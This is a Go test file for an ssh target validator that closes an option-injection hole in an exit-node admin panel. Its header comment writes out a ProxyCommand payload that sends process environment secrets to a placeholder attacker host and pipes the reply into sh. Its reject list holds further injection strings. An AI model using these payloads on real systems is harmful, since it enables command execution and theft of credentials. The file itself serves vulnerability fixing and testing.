// File: internal/headscale/routes_b266_test.go
//
// B266 (2026-09-19) — the ssh_target validator that closes the
// container-root escalation found during the exit-node panel audit.
//
// `exit_servers.ssh_target` is operator-writable through
// POST /admin/exit-nodes/add and was appended POSITIONALLY to the ssh
// argv (`sshArgs = append(sshArgs, host, cmd)`), so a stored value
// beginning with `-` was parsed by ssh as an OPTION. With the skygate
// container holding /var/run/docker.sock and NET_ADMIN+SYS_ADMIN, a
// target like
//
//	-oProxyCommand=curl -s http://attacker/$(cat /proc/self/environ)|sh
//
// was arbitrary command execution reachable from any admin session.
//
// IsSafeSSHTarget is the shape gate; `--` in the argv is the second,
// independent guard.

package headscale

import "testing"

func TestIsSafeSSHTarget_AcceptsRealTargets(t *testing.T) {
	// Every value the live deployment actually stores
	// (see exit_servers on the reference VM).
	for _, in := range []string{
		"root@213.176.92.205",   // emilia (public IP)
		"root@100.64.0.2:18022", // karolina (tailnet IP + custom port)
		"root@100.64.0.4",       // sharlotta
		"relay-4.example.com",
		"deploy@relay-4.example.com:2222",
		"192.0.2.10",
		"192.0.2.10:22",
		"[fd7a:115c:a1e0::4]",
		"root@[fd7a:115c:a1e0::4]:22",
		"relay_4",
	} {
		if !IsSafeSSHTarget(in) {
			t.Errorf("IsSafeSSHTarget(%q) = false; want true (it is a normal [user@]host[:port])", in)
		}
	}
}

func TestIsSafeSSHTarget_RejectsInjectionAndJunk(t *testing.T) {
	for _, in := range []string{
		"",                        // empty → caller's own fallback handles it
		"-oProxyCommand=sh -c id", // THE bug: leading dash = ssh option
		"-F/etc/ssh/ssh_config",   // another option shape
		"root@host; id",           // shell metacharacter
		"root@host|id",            //
		"root@host&&id",           //
		"root@host`id`",           //
		"root@host$(id)",          //
		"root@host two",           // whitespace
		"root@host\ttwo",          //
		"root@host\nid",           //
		"root@host>/tmp/x",        //
		"user'@host",              //
		"user\"@host",             //
		"root@host:0",             // port 0
		"root@host:99999",         // port out of range
		"root@host:abc",           // non-numeric port
		"123",                     // bare digits, not an IP or hostname
		"@host",                   // empty user
		"root@",                   // empty host
		"root@host extra:22",      //
		"$(host)",                 //
	} {
		if IsSafeSSHTarget(in) {
			t.Errorf("IsSafeSSHTarget(%q) = true; want false (option injection / malformed target)", in)
		}
	}
}

func TestIsSafeSSHTarget_LengthBound(t *testing.T) {
	long := "root@" + string(make([]byte, 300))
	if IsSafeSSHTarget(long) {
		t.Errorf("IsSafeSSHTarget accepted a >255-char target")
	}
}
